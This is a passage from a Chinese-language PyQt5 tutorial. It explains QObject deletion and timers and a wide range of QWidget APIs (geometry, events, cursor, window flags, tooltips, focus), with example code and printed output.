应用场景\n\n**过滤筛选控件**\n\n案例： 创建一个窗口, 包含多个QLabel或其他控件，将包含在窗口内所有的QLabel控件, 设置背景色cyan\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"QObject的学习\")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_type_judge()\n\n    def QObject_type_judge(self):\n        label_1 = QLabel(self)\n        label_1.setText(\"标签1\")\n\n        label_2 = QLabel(self)\n        label_2.setText(\"标签2\")\n        label_2.move(100,100)\n\n        btn = QPushButton(self)\n        btn.setText(\"按钮\")\n        btn.move(200,200)\n\n        for widget in self.children():\n            if widget.inherits(\"QLabel\"):\n                widget.setStyleSheet(\"background-color:cyan;\")\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n### 对象删除\n\n#### API\n\n- obj.deleteLater()   稍后删除，删除一个对象时, 也会解除它与父对象之间的关系\n- deleteLater()并没有将对象立即销毁，而是向主消息循环发送了一个event，下一次主消息循环收到这个event之后才会销毁对象，这样做的好处是可以在这些延迟删除的时间内完成一些操作，坏处就是内存释放会不及时\n\n**API测试：**\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # 继承父类的init方法\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('对象删除')\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.QObject_delete()\n\n    def QObject_delete(self):\n        obj1 = QObject()\n        self.obj = obj1\n        obj2 = QObject()\n        obj3 = QObject()\n\n        obj3.setParent(obj2)\n        obj2.setParent(obj1)\n\n        obj1.destroyed.connect(lambda: print(\"obj1 被释放\"))\n        obj2.destroyed.connect(lambda: print(\"obj2 被释放\"))\n        obj3.destroyed.connect(lambda: print(\"obj3 被释放\"))\n\n        # del obj2 # 这时候没有任何效果，因为obj2还被obj1引用着呢！\n        obj2.deleteLater()     # 删除对象时，也会解除它与父对象的关系，而且是稍后删除。\n        print(obj1.children()) # 因为deleteLater是稍后删除，所以子节点还在\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # 创建应用程序对象\n    window = Window()\n    window.show() # 展示控件\n    sys.exit(app.exec_())\n```\n\n输出：\n\n```python\n[<PyQt5.QtCore.QObject object at 0x0000022E610E45E8>]\nobj2 被释放\nobj3 被释放\n```\n\n#### 应用场景\n\n**想要移除某一个对象的时候使用**\n\n### 事件处理\n\n#### API\n\n- childEvent()\n\n- customEvent()\n\n- eventFilter()\n\n- installEventFilter()\n\n- removeEventFilter\n\n- event()\n\n#### 应用场景\n\n**事件机制、拦截事件, 监听特定行为**\n\n案例\n\n暂时欠着。。。\n\n### 定时器\n\n#### API\n\n- startTimer(ms, Qt.TimerType) -> timer_id 启动一个定时器事件并返回一个定时器timer_id \n  - ms   每隔ms毫秒就会启动一次\n\n- Qt.TimerType\n  - Qt.PreciseTimer        精确定时器：尽可能保持毫秒准确\n  - Qt.CoarseTimer         粗定时器：5%的误差间隔\n  - Qt.VeryCoarseTimer  很粗的定时器：只能到秒级\n- timer_id 定时器的唯一标识\n\n- killTimer(timer_id) 根据定时器ID，杀死定时器\n- timerEvent() 定时器执行事件\n\n**API测试**\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass MyQObject(QObject):  # 重写QObject()中的timerevent() 方法\n    def timerEvent(self,evnt):\n        print(evnt,\"每隔一秒打印\")\n\napp = QApplication(sys.argv)\nwindow = QMainWindow()\nwindow.setWindowTitle('定时器')\nobj = MyQObject()\ntime_id = obj.startTimer(1000)  # 每隔1s调用QObject() 中的timerevent() 方法  #所以此时应该重写QObject()中的timerevent() 方法\n# obj.killTimer(time_id)  #如果想停止它，将定时器id 传给 killTimer() 即可\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n输出：\n\n```python\n<PyQt5.QtCore.QTimerEvent object at 0x000002081A182318> 每隔一秒打印\n<PyQt5.QtCore.QTimerEvent object at 0x000002081A182318> 每隔一秒打印\n<PyQt5.QtCore.QTimerEvent object at 0x000002081A182318> 每隔一秒打印\n```\n\n#### 应用场景\n\n**轮询、倒计时**\n\n案例1：创建一个窗口, 并设置一个子控件QLabel，展示10s倒计时，倒计时结束, 就停止计时。\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass MyLabel(QLabel): # 封装版本\n\n    def __init__(self, *args, **kwargs):  # 这更加通用\n        super().__init__(*args, **kwargs)\n        self.setText(\"10\")\n        self.setStyleSheet(\"font-size:22px;\")\n        self.move(200, 200)\n        self.timer_id = self.startTimer(1000)\n\n    def timerEvent(self, *args, **kwargs):\n        # 获取当前的标签内容\n        print(\"开始计时\")\n        current_sec = int(self.text())\n        current_sec -= 1\n        self.setText(str(current_sec))\n        if current_sec == 0:\n            self.killTimer(self.timer_id)\n            print(\"计时结束\")\n\napp = QApplication(sys.argv)\nwindow = QMainWindow()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('定时器')\n\nlabel = MyLabel(window)\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n案例2：创建一个窗口, 通过定时器不断增加该窗口的尺寸大小，每100ms 宽高均增加1px\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass MyWidget(QWidget):\n     def timerEvent(self, *args, **kwargs):\n         current_w = self.width()\n         current_h = self.height()\n         self.resize(current_w+10,current_h+10)\n\napp = QApplication(sys.argv)\nwindow = MyWidget()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('定时器')\n\nwindow.startTimer(100)\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n## QWidget\n\n> 所有的可视控件的基类\n\n### 坐标系统\n\n左上角为坐标原点，向右为x轴正方向，向下为y轴正方向\n\n控件位置参照：\n\n- 一般控件参照父控件\n\n- 顶层控件则参照桌面\n\n### 尺寸位置\n\n#### 尺寸获取API\n\n- x()                            相对于父控件的x位置，没有父控件则相对于桌面的x位置\n- y()                            同上\n- pos()                         x和y的组合，包含窗口框架\n- width()                     控件的宽度，不包含任何窗口框架\n- height()                     控件的高度，不包含任何窗口框架\n- size()                         width和height的组合，不包含任何窗口框架\n- geometry()                用户区域相对于父控件的位置和尺寸组合\n- rect()                          0, 0, width, height的组合\n- frameSize()                框架大小\n- frameGeometry()      框架尺寸\n\n注意: 控件显示完毕之后, 具体的位置或者尺寸数据才会正确\n\n![相关尺寸图示](https://img.jwt1399.top//img/20210729085614.png)\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QWidget\nimport sys\n\napp = QApplication(sys.argv)\nwindow = QWidget()\nwindow.resize(200, 200)\nwindow.move(100, 100)\nwindow.setWindowTitle('尺寸大小')\nprint(window.geometry())  # 输出： PyQt5.QtCore.QRect(100, 100, 200, 200) 错误\n\nwindow.show()\nprint(window.geometry())  # 输出： PyQt5.QtCore.QRect(101, 131, 200, 200) 正确\nsys.exit(app.exec_())\n```\n\n所以，要获取控件的尺寸，一定要在控件显示完毕之后再去获取！\n\n#### 尺寸设置API\n\n- move(x,y)                                    操控的是x, y；也就是pos，包括窗口框架\n- resize(width,height)                    操控的是宽高，不包括窗口框架\n- setGeometry(x_noFrame, y_noFrame, width, height)    注意，此处参照为用户区域\n- adjustSize()                根据内容自适应大小\n- setFixedSize()             设置固定尺寸\n\n点击按钮，复制标签内容，展示在标签后面\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QWidget,QPushButton,QLabel\nimport sys\n\napp = QApplication(sys.argv)\nwindow = QWidget()\nwindow.resize(400, 400)\nwindow.move(100, 100)\nwindow.setWindowTitle('自适应尺寸')\n\nlabel = QLabel(window)\nlabel.setText(\"hello world\")\nlabel.move(100, 100)\nlabel.setStyleSheet(\"background-color:cyan;\")  # 为了更清晰看到具体的区域\n\ndef addContent():\n    new_content = label.text() + \"hello world\"\n    label.setText(new_content)\n    # label.resize(label.width()+100,label.height())  笨方法 改变大小\n    label.adjustSize() #自适应大小\n\nbtn = QPushButton(window)\nbtn.setText(\"增加内容\")\nbtn.move(200, 200)\nbtn.clicked.connect(addContent)\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n#### 案例\n\n通过给定的的个数，你负责在一个窗口内创建相应个数的子控件，按照九宫格的布局进行摆放\n\n```python\nfrom PyQt5.Qt import * #刚开始学习可以这样一下导入\nimport sys\n#创建app\napp  = QApplication(sys.argv)\nwindow = QWidget()\nwindow.show()\nwindow.resize(500,500)\nwindow.move(300,300)\n\n#总控件的个数\nwidget_count = 10\n\n#有多少列\ncolumn_count = 3\n#一个控件的宽度\nwidget_width = window.width() / column_count\n\n#有多少行\nrow_count  = (widget_count-1) // column_count +1\n#一个控件的高度\nwidget_height = window.height() / row_count\n\nfor i in range(widget_count):\n     w = QWidget(window)\n     w.resize(widget_width,widget_height)\n\n     # w.move(widget_width * (i % column_count), widget_height * (i // column_count))\n     x,y = divmod(i,column_count) # x,y = (i//column_count, i%column_count)\n     w.move(widget_width*y,widget_height*x)\n\n     w.setStyleSheet(\"background-color:red;border:1px solid yellow\")\n     w.show()\n\nsys.exit(app.exec_())\n```\n\n#### 辅助工具\n\n下载地址：https://jwt1399.lanzoui.com/iGnrtrz68fg\n\n此工具对 Qwidget 尺寸大小位置 API 进行了全面使用，拖动窗口可实时显示相关位置信息。\n\n![辅助工具图示](https://img.jwt1399.top//img/20210729091303.png)\n\n### 最大最小尺寸\n\n#### 获取API\n\n- minimumWidth()     最小尺寸的宽度\n\n- minimumHeight()    最小尺寸的高度\n\n- minimumSize()         最小尺寸(宽，高)\n\n- maximumWidth()     最大尺寸的宽度\n\n- maximumHeight()    最大尺寸的高度\n\n- maximumSize()         最大尺寸\n\n#### 设置API\n\n- setMinimumWidth()      设置最小宽度\n- setMaximumWidth()    设置最大宽度\n\n- setMinimumHeight()    设置最小高度\n\n- setMinimumSize()         设置最小尺寸\n\n- setMaximumHeight()   设置最大高度\n\n- setMaximumSize()        设置最大尺寸\n\n#### 案例\n\n创建一个窗口, 设置最小尺寸(200,200)和最大尺寸(400,400)，测试通过resize是否可以改变\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nimport sys\n\napp = QApplication(sys.argv)\n\nwindow = QMainWindow()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('最大最小尺寸')\nwindow.setMinimumSize(200,200) #也可单独限制宽和高\nwindow.setMaximumSize(400,400)\nprint(window.maximumSize())\nwindow.resize(500,500)  #通过代码也是无法修改的\nprint(window.maximumSize())\n\nwindow.show()\nsys.exit(app.exec_())\n\n'''\n输出：\nPyQt5.QtCore.QSize(400, 400)\nPyQt5.QtCore.QSize(400, 400)\n'''\n```\n\n### 内容边距\n\n#### API\n\n- setContentsMargins(左, 上, 右, 下)    设置内容边距\n\n- getContentsMargins()   获取内容边距(左, 上, 右, 下)，元组\n\n- contentsRect()   获取内容区域\n\n#### 案例\n\n创建一个窗口, 包含一个标签，标签文本为\"Hello World\"，标签大小为(100, 60)，将文本放在标签的右下角，*默认文本显示是水平靠左，垂直居中的*\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\napp = QApplication(sys.argv)\n\nwindow = QMainWindow()\nwindow.resize(400, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('最大最小尺寸')\n\nlabel = QLabel(window)\nlabel.setText(\"Hello,world\")\nlabel.resize(200,200)\nlabel.setStyleSheet(\"background-color:cyan;border:1px solid red\")\nlabel.setContentsMargins(100,100,0,0)  # 设置内容边距，四个参数是边距,顺时针(左上右下)\nprint(label.getContentsMargins())      #打印各个边内容边距设置的具体值\nprint(label.contentsRect())            #打印各个边内容边距设置的具体值\n\nwindow.show()\nsys.exit(app.exec_())\n\n'''\n输出：\n(100, 100, 0, 0)\nPyQt5.QtCore.QRect(100, 100, 100, 100)\n'''\n```\n\n### 事件*\n\n#### API\n\n显示和关闭事件\n\n- showEvent(QShowEvent) 控件显示时调用\n- closeEvent(QCloseEvent) 控件关闭时调用\n\n移动事件\n\n- moveEvent(QMoveEvent) 控件移动时调用\n\n调整大小\n\n- resizeEvent(QResizeEvent) 控件调整大小时调用\n\n鼠标事件\n\n- enterEvent(QEvent) 鼠标进入时触发\n- leaveEvent(QEvent) 鼠标离开时触发\n- mousePressEvent(QMouseEvent)  鼠标按下时触发\n- mouseReleaseEvent(QMouseEvent)  鼠标释放时触发\n- mouseDoubleClickEvent(QMouseEvent)  鼠标双击时触发\n- mouseMoveEvent(QMouseEvent)  \n  - 鼠标按下后移动时触发\n  - setMouseTracking(True) 追踪设置后，没有按下的移动也能触发 \n\n键盘事件\n\n- keyPressEvent(QKeyEvent)  键盘按下时调用\n- keyReleaseEvent(QKeyEvent)  键盘释放时调用\n\n焦点事件\n\n- focusInEvent(QFocusEvent)    获取焦点时调用\n- focusOutEvent(QFocusEvent) 失去焦点时调用\n\n拖拽事件\n\n- dragEnterEvent(QDragEnterEvent)  拖拽进入控件时调用\n- dragLeaveEvent(QDragLeaveEvent) 拖拽离开控件时调用\n- dragMoveEvent(QDragMoveEvent)  拖拽在控件内移动时调用\n- dropEvent(QDropEvent)  拖拽放下时调用\n\n绘制事件\n\n- paintEvent(QPaintEvent)  显示控件, 更新控件时调用\n\n改变事件\n\n- changeEvent(QEvent)  窗体改变, 字体改变时调用\n\n右键菜单\n\n- contextMenuEvent(QContextMenuEvent)  访问右键菜单时调用\n\n输入法\n\n- inputMethodEvent(QInputMethodEvent)  输入法调用\n\n#### API测试\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # 继承父类的init方法\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('事件')\n        self.setup_ui()\n\n\n    def setup_ui(self):\n        pass\n\n    def showEvent(self, QShowEvent):\n        print(\"窗口被展示了\")\n    def closeEvent(self,QCloseEvent):\n        print(\"窗口被关闭了\")\n    def moveEvent(self,QMoveEvent):\n        print(\"窗口被移动了\")\n    def resizeEvent(self, QSizeEvent):\n        print(\"窗口被改变了大小\")\n    def enterEvent(self, QEvent):\n        print(\"鼠标进入\")\n    def leaveEvent(self, QEvent):\n        print(\"鼠标离开\")\n    def mousePressEvent(self, QMouseEvent):\n        print(\"鼠标按压\")\n    def mouseMoveEvent(self, QMouseEvent):\n        print(\"鼠标按下移动\")\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # 创建应用程序对象\n    window = Window()\n    window.setMouseTracking(True)  # 设置鼠标追踪\n    window.show() # 展示控件\n    sys.exit(app.exec_())\n```\n\n#### 案列\n\n。。。\n\n### 鼠标相关*\n\n#### API\n\n- setCursor(参数) 设置鼠标形状\n\n![鼠标形状](https://img.jwt1399.top//img/20210730115018.png)\n\n除了以上系统提供参数，还可以自定义QCursor对象\n\n- unsetCursor()  重置形状\n\n- cursor() -> QCursor   获取鼠标\n  - QCursor对象\n    - pixmap()  图片\n    - pos()  鼠标位置，相对于整个屏幕的左上角\n    - setPos(x, y) 设置鼠标位置\n\n鼠标跟踪\n\n- hasMouseTracking()  判定是否设置了鼠标跟踪\n- setMouseTracking(bool)  设置鼠标是否跟踪\n  - 所谓的鼠标跟踪，其实就是设置检测鼠标移动事件的条件\n  - 不跟踪  鼠标移动时，必须处于按下状态，才会触发mouseMoveEvent事件\n  - 跟踪      鼠标移动时，不处于按下状态，也会触发mouseMoveEvent事件\n\n#### API测试\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\napp = QApplication(sys.argv)\n\nclass MyWindow(QWidget):\n     def mouseMoveEvent(self, event): # 点击 QMouseEvent 可以查看里面包含的方法\n         # print(\"鼠标移动了\",event.globalPos())  # globalPos() 是整个屏幕为准\n         print(\"鼠标移动了\",event.localPos())  # localPos() 是控件本身为准\n\nwindow = MyWindow()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('鼠标')\n# window.setCursor(Qt.BusyCursor) #设置忙碌鼠标，转圈圈的样式\npixmap = QPixmap(\"C:/Users/admin/Pictures/centos.png\").scaled(50,50) #设置鼠标样式和大小\ncursor = QCursor(pixmap,0,0)  #设置鼠标样式和热点，默认热点为图片中心（-1，-1），热点点击相应位置鼠标点击才会触发，修改为（0,0）， 这就是图片的左上角成为热点。\nwindow.setCursor(cursor)\n# window.unsetCursor()  # 重置鼠标形状，使上面的设置失效\n\ncurrent_cursor = window.cursor()  #获取鼠标对象\nprint(current_cursor.pos())  #获取鼠标的位置，它是相对于整个电脑屏幕的\ncurrent_cursor.setPos(0,0)  # 这时鼠标的位置在屏幕的左上角\n\nwindow.setMouseTracking(True)  #设置跟踪\nprint(window.hasMouseTracking())  #查看鼠标是否处于跟踪状态\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n#### 案例\n\n。。。\n\n#### 辅助工具\n\n下载地址：https://jwt1399.lanzoui.com/iy5gBrz6api\n\n此工具对 QCursor 鼠标形状 API 进行了全面使用，选择对应单选框，可查看对应鼠标效果，还可自定义鼠标形状。\n\n![辅助工具](https://img.jwt1399.top//img/20210730164242.png)\n\n### 父子关系\n\n#### API\n\n- childAt(x, y)  获取在指定坐标的控件\n- parentWidget()  获取指定控件的父控件\n- childrenRect()  所有子控件组成的边界矩形\n\n#### 案例\n\n创建窗口, 包含若干 Label 控件，点击哪个标签, 就让哪个标签背景变红，使用父控件处理和自定义 QLabel 子类 两种方法实现\n\n方法一：自定义 QLabel 子类\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Label(QLabel):\n    def mousePressEvent(self, QMouseEvent):\n        self.setStyleSheet(\"background-color:red\")\n         \n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"父子关系\")\n\nfor i in range(10):\n    label = Label(window)\n    label.setText(\"标签\"+str(i))\n    label.move(30*i,30*i)\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n方法二：使用父控件处理\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QWidget):\n    def mousePressEvent(self, event):\n        local_x = event.x()\n        local_y = event.y()\n        sub_widget = self.childAt(local_x,local_y) #子控件\n        if sub_widget:  # 排除sub_widget 是None\n            sub_widget.setStyleSheet(\"background-color:red;\")\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = Window()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"父子关系\")\n\nfor i in range(10):\n    label = QLabel(window)\n    label.setText(\"标签\"+str(i))\n    label.move(30*i,30*i)\n\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n### 层级控制\n\n#### API\n\n- lower()  将控件降低到最底层\n- raise_()  将控件提升到最上层\n- a.stackUnder(b) 让a放在b下面\n\n### 顶层窗口相关\n\n#### API\n\n​\t图标\n\n- setWindowIcon(QIcon(\"resource/header_icon.png\"))\n\n- windowIcon()\n\n标题\n\n- setWindowTitle(\"社会我顺哥\")\n\n- windowTitle()\n\n不透明度\n\n- setWindowOpacity(float)\n  - 1.0 不透明\n  - 0.0 透明\n\n- windowOpacity()\n\n​\t窗口状态\n\n- setWindowState(state)\n  - Qt.WindowNoState 无状态\n  - Qt.WindowMinimized 最小化\n  - Qt.WindowMaximized 最大化\n  - Qt.WindowFullScreen 全屏\n  - Qt.WindowActive 活动窗口\n- windowState() \n\n最大化最小化\n\n​\t控制\n\n- showFullScreen() 全屏显示 不包含窗口框架\n- showMaximized() 最大化 包括窗口框架\n- showMinimized() 最小化\n- showNormal() 正常\n\n  判定\n\n- isMinimized() 是否是最小化窗口\n- isMaximized() 是否是最大化窗口\n- isFullScreen() 是否全屏\t\n\n窗口标志\n\n- windowFlags()\n\n- setWindowFlags(Qt.WindowStaysOnTopHint)\n\n  - 窗口样式\n\n  ```python\n  Qt.Widget \t\t#默认,一个窗口或控件，包含窗口边框、标题栏（图标、标题、最小化、最大化、关闭）\n  Qt.Window \t\t#一个窗口，包含窗口边框和标题栏（图标、标题、最小化、最大化、关闭）\n  Qt.Dialog \t\t#一个对话框窗口，窗口边框、标题栏（图标、标题、问号、关闭）\n  Qt.Sheet \t\t#一个窗口或部件Macintosh表单\n  Qt.Drawer \t\t#一个窗口或部件Macintosh抽屉\n  Qt.Popup \t\t#一个弹出式顶层窗口\n  Qt.Tool \t\t#一个工具窗口\n  Qt.ToolTip \t\t#一个提示窗口，没有标题栏和窗口边框\n  Qt.SplashScreen #一个欢迎窗口，是QSplashScreen构造函数的默认值\n  Qt.SubWindow \t#一个子窗口\n  ```\n\n  - 顶层窗口外观标志\t\t\n\n  ```python\n  Qt.MSWindowsFixedSizeDialogHint \t#窗口无法调整大小\n  Qt.FramelessWindowHint \t\t\t\t#窗口无边框\n  Qt.CustomizeWindowHint \t\t\t\t#有边框但无标题栏和按钮，不能移动和拖动\n  Qt.WindowTitleHint \t\t\t\t\t#添加标题栏和一个关闭按钮\n  Qt.WindowSystemMenuHint \t\t\t#添加系统目录和一个关闭按钮\n  Qt.WindowMaximizeButtonHint\t\t\t#激活最大化和关闭按钮，禁止最小化按钮\n  Qt.WindowMinimizeButtonHint\t\t\t#激活最小化和关闭按钮，禁止最大化按钮\n  Qt.WindowMinMaxButtonsHint\t\t\t#激活最小化，最大化和关闭按钮\n  Qt.WindowCloseButtonHint\t\t\t#添加一个关闭按钮\n  Qt.WindowContextHelpButtonHint\t\t#添加问号和关闭按钮，同对话框\n  Qt.WindowStaysOnTopHint\t\t\t\t#窗口始终处于顶层位置\n  Qt.WindowStaysOnBottomHint\t\t\t#窗口始终处于底层位置\n  ```\n\n通过 setWindowFlags来设置窗口的 WIndowFlags，多个 WindowFlags之间用 `|` 连接，如：\n\n```python\nwindow = QWidget()\nwindow.setWindowFlags(Qt.Tool | Qt.FramelessWindowHint)\n```\n\n取消某个 WindowFlags：\n\n```python\nwindow.setWindowFlags(window.windowFlags() & ~Qt.FramelessWindowHint)\n```\n\n判断是否设置了某个 WindowFlags：\n\n```python\n(widget.windowFlags() | Qt.FramelessWindowHint) == window.windowFlags()\n```\n\n#### API测试\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QWidget): #通过判定窗口的状态实现点击窗口切换最大和正常\n    def mousePressEvent(self, QMouseEvent):\n        if self.isMaximized():\n            self.showNormal()\n        else:\n            self.showMaximized()\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = Window()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"顶层窗口相关\") #设置标题\nprint(window.windowTitle())  #获取标题\n\nwindow.setWindowIcon(QIcon(\"C:/Users/admin/Pictures/jj.ico\"))  #设置图标\nprint(window.windowIcon())  #获取图标\n\nwindow.setWindowOpacity(0.8)  #设置不透明度\nprint(window.windowOpacity()) #获取不透明度\n\nprint(window.windowState() == Qt.WindowNoState)  # True  说明默认是无状态\nwindow.setWindowState(Qt.WindowMinimized)  #最小化\n\n#展示控件\nwindow.show()\n# window.showMaximized()  #展示最大，这时上面的window.show() 也可以不用要\n# window.showFullScreen()\n# window.showMinimized()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n#### 案例\n\n创建一个窗口，要求无边框，无标题，窗口不透明度0.9，自定义最小化，最大化，关闭按钮，支持拖拽用户区移动。\n\n```python\nfrom PyQt5.Qt import *\nimport sys\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__()\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle(\"顶层窗口操作案例\")\n        self.setWindowFlags(Qt.FramelessWindowHint)  # 无边框无标题\n        self.setWindowOpacity(0.9)  # 不透明度\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.btn_width = 40\n        self.btn_height = 25\n        self.top_margin = 0\n        self.add_close_max_min()\n\n    def add_close_max_min(self): # 添加三个按钮\n        self.close_btn = QPushButton(self)\n        self.close_btn.setText(\"关闭\")\n        self.close_btn.resize(self.btn_width,self.btn_height)\n\n        self.max_btn = QPushButton(self)\n        self.max_btn.setText(\"最大\")\n        self.max_btn.resize(self.btn_width, self.btn_height)\n\n        self.min_btn = QPushButton(self)\n        self.min_btn.setText(\"最小\")\n        self.min_btn.resize(self.btn_width, self.btn_height)\n\n    def resizeEvent(self, QResizeEvent): #监听窗口大小的变化，计算按钮的位置。\n        self.close_btn.move(self.width() - self.close_btn.width(), self.top_margin)\n        self.max_btn.move(self.width() - 2 * self.close_btn.width(), self.top_margin)\n        self.min_btn.move(self.width() - 3 * self.close_btn.width(), self.top_margin)\n\n    def mousePressEvent(self, event):\n        if event.button() == Qt.LeftButton: #按压鼠标左键\n            self.move_flags = True  #移动标志\n            self.mouse_x = event.globalX()\n            self.mouse_y = event.globalY()\n            self.window_x = self.x()\n            self.window_y = self.y()\n\n    def mouseMoveEvent(self, event):\n        if self.move_flags: #当按压鼠标左键，才进行下方移动\n            self.move_x = event.globalX() - self.mouse_x\n            self.move_y = event.globalY() - self.mouse_y\n            self.move(self.window_x + self.move_x, self.window_y + self.move_y)\n\n    def mouseReleaseEvent(self, event):\n        self.move_flags = False\n\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = Window()\n# window = Window(flags=Qt.FramelessWindowHint) #初始化窗口设置Flags\n\n\ndef max_normal_change_slot(): #（最大化/正常）切换槽函数\n    if window.isMaximized():\n        window.showNormal()\n        window.max_btn.setText(\"最大\")\n    else:\n        window.showMaximized()\n        window.max_btn.setText(\"恢复\")\n\nwindow.close_btn.pressed.connect(lambda: window.close())\nwindow.min_btn.pressed.connect(lambda: window.showMinimized())\nwindow.max_btn.pressed.connect(max_normal_change_slot)\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n#### 辅助工具\n\n下载地址：https://jwt1399.lanzoui.com/i6NwYrz69qd\n\n此工具对窗口标志 API 进行了全面使用，选择对应窗口样式和顶层窗口外观标志，可查看对应窗口显示效果。\n\n![辅助工具](https://img.jwt1399.top//img/20210801201124.png)\n\nQt官方也有类似的工具：\n\nhttps://doc.qt.io/qt-5/qtwidgets-widgets-windowflags-example.html\n\n### 交互状态*\n\n。。。\n\n### 信息提示\n\n#### API\n\n状态提示\n\n- setStatusTip(str)  鼠标停在控件上时, 展示在状态栏\n- statusTip()\t 获取设置的状态提示信息\n\n工具提示\n\n- setToolTip(str)  鼠标悬停在控件上一会后, 展示在旁边\n- toolTip()   获取设置的工具提示信息\n\n- \n  setToolTipDuration(msec)  设置工具提示的时长\n- toolTipDuration() \t获取工具提示的时长\n\n这是啥提示\n\n- setWhatsThis(str)  \t切换到\"查看这是啥\"模式, 再点击该控件时显示\n- whatsThis()  获取设置的这是啥提示信息\n\n#### API测试\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()  # QMainWindow采用懒加载的方式(当控件用的时候才会加载上去)\nwindow.statusBar()      # 使用状态栏，状态栏显示\nwindow.setWindowFlags(Qt.WindowContextHelpButtonHint)  #换个带问号的窗口样式\nlabel = QLabel(window)\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"信息提示\")\nlabel.setText(\"标签\")\n\n#设置状态提示\nwindow.setStatusTip(\"这是一个窗口\")\nprint(window.statusTip()) #获取提示信息\n#设置工具提示\nlabel.setToolTip(\"这是一个标签\")\nprint(label.toolTip())\n#设置工具提示时长\nlabel.setToolTipDuration(2000)  #设置提示时长为2s\nprint(label.toolTipDuration())  #获取提示时长\n#设置这是啥提示\nlabel.setWhatsThis(\"这是啥？这是标签\")  #点击右上角？号，再点击标签才显示\nprint(label.whatsThis()) #获取提示信息\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n### 焦点控制\n\n#### API\n\n单个控件角度\n\n- setFocus()  指定控件获取焦点\n- setFocusPolicy(Policy) 设置焦点获取策略\n  - Policy\n    - Qt.TabFocus\t    通过Tab键获得焦点\n    - Qt.ClickFocus     通过被单击获得焦点\n    - Qt.StrongFocus  可通过上面两种方式获得焦点\n    - Qt.NoFocus 不能通过上两种方式获得焦点(默认值),setFocus仍可使其获得焦点\n- clearFocus() 取消焦点\n\n父控件角度\n\n- focusWidget()    获取子控件中当前聚焦的控件\n- focusNextChild()  聚焦下一个子控件\n- focusPreviousChild()   聚焦上一个子控件\n- focusNextPrevChild(bool)\n  - True: 下一个\n  - False: 上一个\n- setTabOrder(pre_widget , next_widget)  静态方法，设置子控件获取焦点的先后顺序\n\n#### API测试\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QWidget):\n    def mousePressEvent(self, event):\n        # self.focusNextChild()  #在子控件中切换焦点\n        # self.focusPreviousChild()  #反序\n        self.focusNextPrevChild(False)  # True 是前面的Next False 是后面的Prev\n        # print(self.focusWidget())  # 点击时获取它的子控件中获取焦点的那个\n\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = Window()\nlineEdit1 = QLineEdit(window)\nlineEdit2 = QLineEdit(window)\nlineEdit3 = QLineEdit(window)\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"焦点控制\")\n\nlineEdit1.move(100,50)\nlineEdit2.move(100,100)\nlineEdit3.move(100,150)\n\nlineEdit2.setFocus() 